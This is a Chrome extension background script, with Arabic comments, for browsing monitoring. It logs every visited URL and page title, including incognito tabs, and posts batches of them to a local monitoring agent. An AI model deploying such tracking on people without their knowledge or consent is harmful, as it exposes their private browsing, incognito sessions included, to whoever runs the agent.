// إضافة مراقبة التصفح — ترسل كل فتحات الصفحات (بما فيها الوضع الخفي)
// إلى وكيل المراقبة المحلي على 127.0.0.1:48452
const AGENT_URL = "http://127.0.0.1:48452/extension";
const FLUSH_ALARM = "flush-buffer";

let buffer = [];

function pushEvent(ev) {
  buffer.push(ev);
  if (buffer.length >= 10) flush();
}

function classifyBrowser() {
  const ua = navigator.userAgent;
  if (ua.includes("Edg/")) return "Edge";
  if (ua.includes("OPR/")) return "Opera";
  if (ua.includes("Brave")) return "Brave";
  if (ua.includes("Firefox")) return "Firefox";
  return "Chrome";
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url && /^https?:/i.test(changeInfo.url)) {
    pushEvent({
      url: changeInfo.url,
      title: tab.title || "",
      incognito: tab.incognito === true,
      browser: classifyBrowser(),
    });
  }
});

chrome.tabs.onCreated.addListener((tab) => {
  if (tab.url && /^https?:/i.test(tab.url)) {
    pushEvent({
      url: tab.url,
      title: tab.title || "",
      incognito: tab.incognito === true,
      browser: classifyBrowser(),
    });
  }
});

async function flush() {
  if (!buffer.length) return;
  const batch = buffer.splice(0, buffer.length);
  try {
    await fetch(AGENT_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ events: batch }),
    });
  } catch (e) {
    // البرنامج المحلي غير مشغل — نعيد الأحداث للقائمة (حتى 500 حدث كحد أقصى)
    buffer = batch.concat(buffer).slice(-500);
  }
}

// MV3 service worker: نستخدم chrome.alarms بدل setInterval
chrome.alarms.create(FLUSH_ALARM, { periodInMinutes: 0.5 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === FLUSH_ALARM) flush();
});

// ومحاولة الإرسال عند كل نشاط للـ service worker
flush();
